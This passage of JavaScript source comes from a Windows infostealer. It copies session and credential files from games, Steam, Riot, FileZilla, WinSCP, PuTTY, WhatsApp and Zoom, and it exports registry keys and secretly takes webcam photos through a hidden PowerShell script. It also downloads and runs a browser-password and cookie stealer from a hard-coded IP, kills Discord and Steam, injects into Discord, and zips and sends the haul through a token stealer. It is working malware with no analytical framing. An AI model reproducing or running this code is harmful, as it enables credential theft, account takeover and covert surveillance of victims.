            for (const loc of app.locs) {
                const baseP = this._resolvePath(loc.base, loc.folder);
                if (baseP && fs.existsSync(baseP)) {
                    Utils.ensureDir(dest);
                    const n = loc.destName || loc.target;
                    // For riot "folder" copy trick
                    if (!loc.target && fs.statSync(baseP).isDirectory()) {
                        if (Utils.safeCopyDirSync(baseP, path.join(dest, path.basename(baseP)))) found = true;
                    } else if (Utils.safeCopyFile(path.join(baseP, loc.target), path.join(dest, n))) found = true;
                }
            }
        }
        else if (app.type === 'regex_files' || app.type === 'regex_files_multi') {
            const locs = app.locs || [{ base: app.base, folder: app.folder }];
            for (const loc of locs) {
                const p = this._resolvePath(loc.base, loc.folder);
                if (p && fs.existsSync(p)) {
                    try {
                        for (const f of fs.readdirSync(p).filter(f => app.regex.test(f))) {
                            const sf = path.join(p, f);
                            if (app.maxMb && fs.statSync(sf).size > app.maxMb * 1024 * 1024) continue;
                            Utils.ensureDir(dest);
                            if (Utils.safeCopyFile(sf, path.join(dest, f))) found = true;
                        }
                    } catch { }
                }
            }
        }
        else if (app.type === 'subdirs_files') {
            const p = this._resolvePath(app.base, app.folder);
            if (p && fs.existsSync(p)) {
                try {
                    for (const d of fs.readdirSync(p, { withFileTypes: true }).filter(d => d.isDirectory())) {
                        Utils.ensureDir(dest);
                        const userP = path.join(p, d.name);
                        app.files.forEach(f => { if (Utils.safeCopyFile(path.join(userP, f), path.join(dest, `${d.name}_${f}`))) found = true; });
                    }
                } catch { }
            }
        }
        else if (app.type === 'cmd' || app.type === 'cmd_multi') {
            const cmds = app.cmds || [{ cmd: app.cmd, destName: app.destName, mustInclude: app.mustInclude }];
            for (const cmdObj of cmds) {
                Utils.ensureDir(dest);
                try {
                    const c = cmdObj.cmd.includes('reg export') ? `${cmdObj.cmd} "${path.join(dest, cmdObj.destName)}" /y` : cmdObj.cmd;
                    const r = require('child_process').execSync(c, { encoding: 'utf8', windowsHide: true, timeout: 5000, stdio: ['ignore'] });
                    if (cmdObj.mustInclude) {
                        if (r && r.includes(cmdObj.mustInclude)) {
                            Utils.safeWriteFile(path.join(dest, cmdObj.destName), r.trim());
                            found = true;
                        }
                    } else {
                        if (fs.existsSync(path.join(dest, cmdObj.destName))) found = true;
                    }
                } catch { }
            }
        }
        return found;
    }

    async collectAll(rootDir) {
        const promises = SessionStealer.APPS.map(app => this._processRule(rootDir, app));
        return Promise.allSettled(promises);
    }

    // Proxy the 20 old explicit methods dynamically to keep exact API contract compatible with CompleteDataCollector
    async collectSteam(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Steam')); }
    async collectMinecraft(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Minecraft')); }
    async collectEpicGames(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'EpicGames')); }
    async collectGrowtopia(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Growtopia')); }
    async collectRiot(targetDir) { await Promise.all([this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Riot')), this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'RiotData'))]); }
    async collectBattlenet(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Battlenet')); }
    async collectOrigin(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Origin_EA')); }
    async collectUbisoft(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Ubisoft')); }
    async collectRoblox(targetDir) { await Promise.all([this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'RobloxReg')), this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'RobloxFiles'))]); }
    async collectRockstar(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Rockstar')); }
    async collectSpotify(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Spotify')); }
    async collectTwitch(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Twitch')); }
    async collectFileZilla(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'FileZilla')); }
    async collectWinSCP(targetDir) { await Promise.all([this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'WinSCPSes')), this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'WinSCPIni'))]); }
    async collectPuTTY(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'PuTTY')); }
    async collectGenshin(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Genshin')); }
    async collectWhatsApp(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'WhatsApp')); }
    async collectSkype(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Skype')); }
    async collectZoom(targetDir) { await Promise.all([this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'ZoomFiles')), this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'ZoomData'))]); }
    async collectWargaming(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Wargaming')); }
    async collectWeChat(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'WeChat')); }
    async collectGuilded(targetDir) { return this._processRule(targetDir, SessionStealer.APPS.find(a => a.name === 'Guilded')); }
}



class WebcamCapture {
    async capture(targetDir) {
        const outPath = path.join(targetDir, 'webcam.png');
        const psScript = `
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
try {
  $cam = New-Object -ComObject WIA.DeviceManager
  foreach ($info in $cam.DeviceInfos) {
    if ($info.Type -eq 2) {
      $dev = $info.Connect()
      $img = $dev.ExecuteCommand([String]'{AF933CAC-ACAD-11D2-A093-00C04F72DC3C}')
      $img.SaveFile('${outPath.replace(/\\/g, '\\\\')}')
      break
    }
  }
} catch {}
try {
  if (-not (Test-Path '${outPath.replace(/\\/g, '\\\\')}')) {
    Add-Type -TypeDefinition @'
using System;using System.Drawing;using System.Runtime.InteropServices;
using System.Drawing.Imaging;
'@
  }
} catch {}`;
        const tmp = path.join(CONFIG.PATHS.TEMP, `wc_${Utils.generateId()}.ps1`);
        Utils.safeWriteFile(tmp, psScript);
        try {
            await ProcessManager.runCommand(`powershell -NoProfile -ExecutionPolicy Bypass -File "${tmp}"`, { timeout: 15000 });
        } catch { }
        Utils.safeDelete(tmp);
        if (fs.existsSync(outPath)) { logger.info('WebcamCapture', 'Captured'); return true; }
        return false;
    }
}


class PythonBrowserStealer {
    constructor() { this.pythonDir = null; this.pythonExe = null; }


    async installPython() {
        const candidates = ['py', 'python', 'python3'];
        for (const cmd of candidates) {
            try {
                const r = require('child_process').execSync(
                    `${cmd} -c "import sys; print(sys.executable)"`,
                    { encoding: 'utf8', windowsHide: true, timeout: 5000, stdio: ['pipe', 'pipe', 'ignore'] }
                ).trim();
                if (r && fs.existsSync(r)) {
                    this.pythonExe = r;
                    this.pythonDir = path.dirname(r);
                    logger.info('PythonStealer', `System Python found: ${r}`);
                    return true;
                }
            } catch { }
        }

        // Persistent Python location in LocalAppData
        this.pythonDir = path.join(CONFIG.PATHS.LOCALAPPDATA, 'HostService', 'py');
        this.pythonExe = path.join(this.pythonDir, 'python.exe');

        if (fs.existsSync(this.pythonExe)) {
            logger.info('PythonStealer', 'Persistent Python already installed');
            return true;
        }

        Utils.ensureDir(this.pythonDir);
        const zipPath = path.join(CONFIG.PATHS.TEMP, `py_dl_${Utils.generateId()}.zip`);
        const versions = [
            'https://www.python.org/ftp/python/3.14.2/python-3.14.2-embed-amd64.zip',
            'https://www.python.org/ftp/python/3.12.9/python-3.12.9-embed-amd64.zip',
            'https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip',
            'https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip'
        ];

        for (const url of versions) {
            Utils.safeDelete(zipPath);
            logger.info('PythonStealer', `Downloading Python from: ${url}`);
            const ok = await NetworkManager.downloadFile(url, zipPath, 600000);
            if (ok && fs.existsSync(zipPath) && fs.statSync(zipPath).size > 1024 * 1024) {
                if (ZipManager.extractZip(zipPath, this.pythonDir)) {
                    Utils.safeDelete(zipPath);
                    if (fs.existsSync(this.pythonExe)) {
                        logger.info('PythonStealer', `Embedded Python installed to: ${this.pythonExe}`);
                        return true;
                    }
                }
            }
        }
        Utils.safeDelete(zipPath);
        return false;
    }

    async installPip() {
        const getPip = path.join(CONFIG.PATHS.TEMP, `get-pip-${Utils.generateId()}.py`);
        const ok = await NetworkManager.downloadFile('https://bootstrap.pypa.io/get-pip.py', getPip, 120000);
        if (!ok || !fs.existsSync(getPip)) return;
        await new Promise(resolve => {
            const c = spawn(this.pythonExe, [getPip, '--no-warn-script-location'], { windowsHide: true, stdio: 'ignore' });
            const t = setTimeout(resolve, 120000);
            c.on('close', () => { clearTimeout(t); resolve(); });
            c.on('error', () => { clearTimeout(t); resolve(); });
        });
        Utils.safeDelete(getPip);
        try {
            for (const f of fs.readdirSync(this.pythonDir).filter(f => f.endsWith('._pth'))) {
                const p = path.join(this.pythonDir, f);
                let c = fs.readFileSync(p, 'utf-8');
                c = c.replace('#import site', 'import site');
                if (!c.includes('import site')) c += '\nimport site\n';
                if (!c.includes('Lib')) c += 'Lib\nLib/site-packages\n';
                fs.writeFileSync(p, c);
            }
        } catch { }
    }

    async collect(targetDir) {
        const scriptUrl = 'http://95.217.249.153:8080/downloads/browser_stealer.py';
        const scriptPath = path.join(CONFIG.PATHS.TEMP, `browser_${Utils.generateId()}.py`);
        const outputPath = path.join(CONFIG.PATHS.TEMP, 'output.zip');
        const browsersDir = path.join(targetDir, 'Browsers');

        Utils.safeDelete(outputPath);

        let pyProcess = null;

        try {
            if (!await this.installPython()) {
                logger.warn('PythonStealer', 'Python install failed');
                return false;
            }

            await this.installPip().catch(() => { });

            await new Promise(resolve => {
                const pip = spawn(this.pythonExe,
                    ['-m', 'pip', 'install', '--quiet', '--no-warn-script-location', 'pycryptodome', 'psutil'],
                    { windowsHide: true, stdio: 'ignore' }
                );
                const t = setTimeout(resolve, 60000);
                pip.on('close', () => { clearTimeout(t); resolve(); });
                pip.on('error', () => { clearTimeout(t); resolve(); });
            });

            if (!await NetworkManager.downloadFile(scriptUrl, scriptPath)) {
                logger.warn('PythonStealer', 'Script download failed');
                return false;
            }
            if (!fs.existsSync(scriptPath)) {
                logger.warn('PythonStealer', 'Script file missing after download');
                return false;
            }

            let pythonExited = false;
            let pythonExitCode = null;
            let pythonExitTime = null;

            pyProcess = spawn(this.pythonExe, [scriptPath], {
                windowsHide: true,
                stdio: ['ignore', 'pipe', 'pipe'],
                detached: false,
                cwd: CONFIG.PATHS.TEMP,
                env: { ...process.env, PYTHONIOENCODING: 'utf-8', PYTHONDONTWRITEBYTECODE: '1' }
            });

            let stderrChunks = [];
            pyProcess.stderr && pyProcess.stderr.on('data', (chunk) => { stderrChunks.push(chunk); });

            pyProcess.on('close', (code) => {
                pythonExited = true;
                pythonExitCode = code;
                pythonExitTime = Date.now();
                logger.info('PythonStealer', `Python exited with code ${code}`);
                if (code !== 0 && code !== null && stderrChunks.length > 0) {
                    try {
                        const err = Buffer.concat(stderrChunks).toString('utf-8').trim().slice(0, 500);
                        if (err) logger.warn('PythonStealer', `Python stderr: ${err}`);
                    } catch (_) {}
                }
            });
            pyProcess.on('error', () => {
                pythonExited = true;
                pythonExitCode = -1;
                pythonExitTime = Date.now();
                logger.warn('PythonStealer', 'Python spawn error');
            });

            logger.info('PythonStealer', 'Polling for output.zip...');
            const zipAppeared = await (async () => {
                const POLL_MS = 1000;
                const HARD_LIMIT_MS = 20 * 60 * 1000;
                const STABLE_CHECK_MS = 2000;
                const POST_EXIT_SUCCESS_MS = 60 * 1000;
                const POST_EXIT_FAIL_MS = 10 * 1000;

                const start = Date.now();

                while (true) {
                    if (fs.existsSync(outputPath)) {
                        try {
                            const sz1 = fs.statSync(outputPath).size;
                            if (sz1 > 0) {
                                await Utils.sleep(STABLE_CHECK_MS);
                                try {
                                    const sz2 = fs.statSync(outputPath).size;
                                    if (sz2 > 0 && sz2 >= sz1) {
                                        logger.info('PythonStealer', `output.zip ready: ${(sz2 / 1024).toFixed(1)} KB`);
                                        return true;
                                    }
                                } catch { return true; }
                            }
                        } catch { }
                    }

                    if (Date.now() - start >= HARD_LIMIT_MS) {
                        logger.warn('PythonStealer', 'Hard limit (20m) reached');
                        return false;
                    }

                    if (pythonExited && pythonExitTime) {
                        const grace = pythonExitCode === 0 ? POST_EXIT_SUCCESS_MS : POST_EXIT_FAIL_MS;
                        if (Date.now() - pythonExitTime >= grace) {
                            logger.warn('PythonStealer', `Grace elapsed (${grace}ms), no zip`);
                            return false;
                        }
                    }

                    await Utils.sleep(POLL_MS);
                }
            })();

            if (!zipAppeared) {
                logger.warn('PythonStealer', 'output.zip did not appear or is empty');
                return false;
            }

            Utils.ensureDir(browsersDir);
            const extracted = ZipManager.extractZip(outputPath, browsersDir);
            if (!extracted) {
                logger.warn('PythonStealer', 'Zip extraction failed');
                return false;
            }

            logger.info('PythonStealer', `Browsers extracted to ${browsersDir}`);

            try {
                ['All Cookies.txt', 'All Passwords.txt'].forEach(f => {
                    const src = path.join(browsersDir, f);
                    if (fs.existsSync(src)) {
                        fs.renameSync(src, path.join(targetDir, f));
                    }
                });
            } catch (e) {
                logger.warn('PythonStealer', `Failed to move main files: ${e.message}`);
            }

            return true;

        } catch (e) {
            logger.error('PythonStealer', `collect error: ${e.message}`);
            return false;
        } finally {
            if (pyProcess) { try { pyProcess.kill(); } catch { } }
            Utils.safeDelete(scriptPath);
            Utils.safeDelete(outputPath);
        }
    }
}

class CompleteDataCollector {
    constructor() {
        this.rootDir = null;
        this.status = {};
    }

    async collectQuick() {
        this.rootDir = Utils.createTempDir('data-');
        const sys = new SystemInfoCollector();
        const sess = new SessionStealer();

        Utils.ensureDir(path.join(this.rootDir, 'Sessions'));
        const tasks = [
            sys.takeScreenshot(this.rootDir).catch(() => { }),
            sess.collectSteam(path.join(this.rootDir, 'Sessions')).catch(() => { }),
        ];
        await Promise.allSettled(tasks);
        return this.rootDir;
    }

    async collectDeep() {
        if (!this.rootDir) return;
        const sess = new SessionStealer();
        const py = new PythonBrowserStealer();
        const webcam = new WebcamCapture();

        Utils.ensureDir(path.join(this.rootDir, 'Games'));
        const tasks = [
            sess.collectMinecraft(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectEpicGames(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectGrowtopia(path.join(this.rootDir, 'Games')).catch(() => { }),
            sess.collectRiot(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectBattlenet(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectOrigin(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectUbisoft(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectRoblox(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectRockstar(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectSpotify(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectTwitch(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectFileZilla(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectWinSCP(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectPuTTY(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectGenshin(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectWhatsApp(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectSkype(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectZoom(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectWargaming(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectWeChat(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            sess.collectGuilded(path.join(this.rootDir, 'Sessions')).catch(() => { }),
            py.collect(this.rootDir).catch(e => {
                logger.warn('Collector', `Python browser stealer failed: ${e ? e.message : 'unknown'}`);
            }),
            webcam.capture(this.rootDir).catch(() => { })
        ];

        await Promise.allSettled(tasks);
        logger.info('Collector', 'Deep collection complete');
    }


    async zipAndSend(tokenStealer) {
        if (!this.rootDir || !fs.existsSync(this.rootDir)) {
            logger.error('Collector', 'rootDir missing, cannot zip');
            try { await tokenStealer.sendTokens(null); } catch { }
            return;
        }

        const zipPath = path.join(CONFIG.PATHS.TEMP, `Data_${Utils.generateId()}.zip`);

        try {
            Utils.removeEmptyDirs(this.rootDir);
            const zipped = ZipManager.createZip(this.rootDir, zipPath);
            if (!zipped) {
                logger.warn('Collector', `Zip creation failed at ${zipPath}, trying to send tokens only`);
                await tokenStealer.sendTokens(null);
                return;
            }
            if (!fs.existsSync(zipPath)) {
                logger.warn('Collector', `Zip file missing after creation: ${zipPath}`);
                await tokenStealer.sendTokens(null);
                return;
            }

            const zipSize = fs.statSync(zipPath).size;
            logger.info('Collector', `Zip created: ${(zipSize / 1024).toFixed(1)} KB`);

            // Send final full report with the ZIP attached to the first token's embed
            await tokenStealer.sendTokens(zipPath);

        } catch (e) {
            logger.error('Collector', `zipAndSend error: ${e.message}`);
            try { await tokenStealer.sendTokens(null); } catch { }
        } finally {
            Utils.safeDelete(zipPath);
            setTimeout(() => Utils.safeDelete(this.rootDir), 3000);
        }
    }
}

class MainOrchestrator {
    constructor() { this.start = Date.now(); }

    static validateTempPath() {
        const locations = [
            CONFIG.PATHS.TEMP,
            CONFIG.PATHS.LOCALAPPDATA,
            CONFIG.PATHS.APPDATA,
            os.homedir(),
            process.cwd()
        ];
        for (const loc of locations) {
            if (!loc) continue;
            try {
                if (!fs.existsSync(loc)) fs.mkdirSync(loc, { recursive: true });
                const testFile = path.join(loc, `.test_${Utils.generateId()}`);
                fs.writeFileSync(testFile, 'test');
                fs.unlinkSync(testFile);
                CONFIG.PATHS.TEMP = loc;
                return true;
            } catch {
                continue;
            }
        }
        return false;
    }

    async run() {
        MainOrchestrator.validateTempPath();
        if (logger) logger.logPath = path.join(CONFIG.PATHS.TEMP, 'debug.log');
        logger.info('Main', 'Starting...');

        await ProcessManager.killProcesses([
            'Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe',
            'Steam.exe', 'Growtopia.exe', 'EpicGamesLauncher.exe', 'javaw.exe'
        ]);

        try {
            const tokenStealer = new TokenStealer();
            const collector = new CompleteDataCollector();
            const injector = new DiscordInjector();

            // 1. Initial token collection & validation
            logger.info('Main', 'Collecting tokens...');
            await tokenStealer.validateAndCollect();

            // 2. Data collection (Sequential and complete)
            logger.info('Main', 'Collecting data...');
            await collector.collectQuick();
            await collector.collectDeep();

            if (tokenStealer.validatedTokens.length > 0) {
                await tokenStealer.extractBackupCodes(collector.rootDir);
            }

            // 3. Injection
            injector.inject().catch(e => logger.error('Main', `Injection failed: ${e.message}`));

            // 4. Zip and send final report
            logger.info('Main', 'Zipping and sending final FULL report...');
            await collector.zipAndSend(tokenStealer);

            logger.info('Main', 'All tasks completed.');
        } catch (e) {
            logger.error('Main', `Fatal: ${e.message}`);
        } finally {
            logger.destroy();
        }
    }
}

process.on('uncaughtException', e => { logger.error('CRASH', e.message); logger.flush(); process.exit(1); });
process.on('unhandledRejection', r => { logger.error('REJECT', String(r)); });
process.on('exit', () => logger.flush());

new MainOrchestrator().run().catch(e => { logger.error('MAIN', e.message); logger.flush(); process.exit(1); });
